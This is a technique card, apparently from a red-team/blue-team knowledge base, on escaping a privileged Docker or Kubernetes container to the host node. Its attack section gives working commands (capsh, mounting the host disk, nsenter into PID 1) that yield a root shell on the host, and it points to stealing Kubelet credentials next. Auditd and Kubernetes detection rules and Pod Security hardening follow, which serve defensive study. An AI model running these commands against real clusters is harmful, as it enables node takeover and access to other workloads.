# [PE-EXPLOIT-004]: Container Escape to Host (Generic/Privileged)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-EXPLOIT-004 |
| **MITRE ATT&CK v18.1** | [Escape to Host (T1611)](https://attack.mitre.org/techniques/T1611/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Linux / Docker / Kubernetes |
| **Severity** | **High** |
| **CVE** | **CVE-2025-21196** (Related Context) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Container escape involves breaking the isolation mechanisms (Namespaces, cgroups, Capabilities) to execute code on the underlying host OS. If a container is run with the `--privileged` flag or has sensitive host paths mounted (like `/` or `/proc`), an attacker can spawn a new process directly on the host or load a kernel module.
- **Attack Surface:** Privileged Containers or Dangerous Mounts.
- **Business Impact:** **Cluster Node Compromise**. Access to all other pods on that node and potentially Kubelet credentials.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Root inside a Privileged Container.
- **Tools:**
    - `nsenter`
    - `capsh`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify Privileges**
Check for `000...` capabilities (full) or accessible devices.
```bash
capsh --print
fdisk -l
```

**Step 2: Mount Host Root**
If privileged, mount the host's disk.
```bash
mkdir /host
mount /dev/sda1 /host
```

**Step 3: Escape (nsenter)**
Switch namespaces to the host's PID 1.
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
*You are now root on the host node.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Host Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Auditd** | `Exec` | Execution of `nsenter` or mounting of `/dev/sd*` originating from a container process (check `auid`). |
| **Kubernetes Audit** | `PodCreate` | Creation of Pods with `privileged: true` or `hostPath: /`. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Pod Security Standards:** Enforce "Restricted" mode. Block `privileged` containers and `hostPath` volumes via Admission Controllers (OPA Gatekeeper / Kyverno).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [CA-TOKEN-013] (Steal Kubelet Creds)
